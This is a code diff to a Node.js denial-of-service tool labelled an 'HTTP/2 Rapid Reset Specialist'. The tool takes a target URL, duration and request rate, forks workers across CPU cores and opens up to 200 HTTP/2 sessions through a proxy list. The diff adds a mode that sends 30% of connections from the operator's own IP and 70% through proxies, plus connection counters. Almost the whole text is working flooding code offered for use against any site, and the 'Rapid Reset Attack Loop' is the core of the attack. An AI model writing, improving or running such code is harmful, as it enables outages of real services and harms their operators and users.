@@ -1,6 +1,7 @@
 // R10-1: RAPID-FIRE - HTTP/2 Rapid Reset Specialist
 // Focus: Maximum request rate with minimal CPU
 // Technique: Stream cancellation + Connection reuse
+// Updated: Mixed main IP + proxies
 
 const http2 = require('http2');
 const tls = require('tls');
@@ -21,8 +22,12 @@ try {
         .filter(line => line && !line.startsWith('#') && line.includes(':'));
     console.log(`[R10-1] Loaded ${proxies.length} proxies`);
 } catch (e) {
-    console.log('[R10-1] No proxy.txt found, running without proxies');
+    console.log('[R10-1] No proxy.txt found, running with main IP only');
 }
+
+// Add MAIN IP to proxy list (special flag)
+const USE_MAIN_IP = true; // Set to true to use main IP
+const MIX_RATIO = 0.3; // 30% main IP, 70% proxies
 
 try {
     userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
@@ -40,6 +45,7 @@ try {
 
 if (cluster.isMaster) {
     console.log(`[R10-1] Master ${process.pid} launching ${CPU_CORES} workers`);
+    console.log(`[R10-1] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
     for (let i = 0; i < CPU_CORES; i++) cluster.fork();
     
     setTimeout(() => {
@@ -51,6 +57,10 @@ if (cluster.isMaster) {
     const rate = process.argv[4] || 1000;
     
     startRapidFire(target, time, rate);
+}
+
+function shouldUseMainIp() {
+    return USE_MAIN_IP && Math.random() < MIX_RATIO;
 }
 
 function createProxiedConnection(proxy, targetHost) {
@@ -78,29 +88,41 @@ function createProxiedConnection(proxy, targetHost) {
     });
 }
 
+function createDirectConnection(targetHost) {
+    return new Promise((resolve, reject) => {
+        const tlsConn = tls.connect({
+            host: targetHost,
+            port: 443,
+            servername: targetHost,
+            rejectUnauthorized: false,
+            ALPNProtocols: ['h2']
+        }, () => resolve(tlsConn));
+        
+        tlsConn.on('error', reject);
+    });
+}
+
 function startRapidFire(target, time, rate) {
     const parsed = new URL(target);
     const sessions = [];
     let requestCount = 0;
+    let mainIpCount = 0;
+    let proxyCount = 0;
     
-    // Create connection pool with proxies
+    // Create connection pool
     (async () => {
-        for (let i = 0; i < Math.min(100, proxies.length || 100); i++) {
+        for (let i = 0; i < 200; i++) {
             try {
                 let tlsConn;
+                const useMain = shouldUseMainIp();
                 
-                if (proxies.length > 0) {
+                if (!useMain && proxies.length > 0) {
                     const proxy = proxies[i % proxies.length];
                     tlsConn = await createProxiedConnection(proxy, parsed.hostname);
+                    proxyCount++;
                 } else {
-                    // Direct connection
-                    tlsConn = tls.connect({
-                        host: parsed.hostname,
-                        port: 443,
-                        servername: parsed.hostname,
-                        rejectUnauthorized: false,
-                        ALPNProtocols: ['h2']
-                    });
+                    tlsConn = await createDirectConnection(parsed.hostname);
+                    mainIpCount++;
                 }
                 
                 const session = http2.connect(parsed.origin, {
@@ -113,8 +135,10 @@ function startRapidFire(target, time, rate) {
                 // Skip failed connections
             }
             
-            if (i >= 100) break;
+            if (i >= 200) break;
         }
+        
+        console.log(`[R10-1] Connections: Main IP: ${mainIpCount}, Proxy: ${proxyCount}`);
     })();
     
     // Rapid Reset Attack Loop
@@ -148,11 +172,11 @@ function startRapidFire(target, time, rate) {
                 } catch (e) {}
             }
         }
-    }, 10); // 10ms intervals = 100,000+ RPS
+    }, 10);
     
     // Show stats
     const statsInterval = setInterval(() => {
-        console.log(`[RAPID10-1] RPS: ${requestCount} | Sessions: ${sessions.length}`);
+        console.log(`[R10-1] RPS: ${requestCount} | Sessions: ${sessions.length} | Main IP: ${mainIpCount} | Proxy: ${proxyCount}`);
         requestCount = 0;
     }, 1000);
     
